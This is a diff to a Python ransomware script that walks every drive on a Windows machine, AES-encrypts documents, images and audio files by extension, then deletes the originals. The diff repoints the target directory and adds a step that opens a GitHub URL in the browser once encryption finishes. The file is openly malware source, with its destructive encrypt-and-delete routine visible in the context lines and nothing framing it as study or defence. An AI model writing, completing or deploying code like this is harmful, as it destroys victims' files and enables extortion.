@@ -1,10 +1,12 @@
 #!/usr/bin/python
-import os, random, struct, hashlib, time, win32api
+import os, random, struct, hashlib, time, win32api, webbrowser
 from Crypto.Cipher import AES
 
 extensions = ['.mp3','.txt','.docx','.doc','.xlsx','.png','.jpg','jpeg']
-homedir = ".\File"
+homedir = "C:\Users\Python\Desktop\Ransom\File"
 path = os.path.join(homedir, "firstdir")
+url = "https://github.com/luisxciv/SYrans"
+new = 2
 
 def encryption(key):
     for drive in win32api.GetLogicalDriveStrings().split('\000')[:-1]:
@@ -22,8 +24,7 @@ def encryption(key):
                     encrypt(key,in_filename)
                     print "[+] - Files are now encrypted."
                     #
-    
-                 
+
                     print "[!] - Deleting Original Files..."
                     #
                     os.remove(os.path.join(root, file))
@@ -63,5 +64,6 @@ def password():
     encryption(key)
 def main():
     password()
+    webbrowser.open(url, new=new)
 
 main()
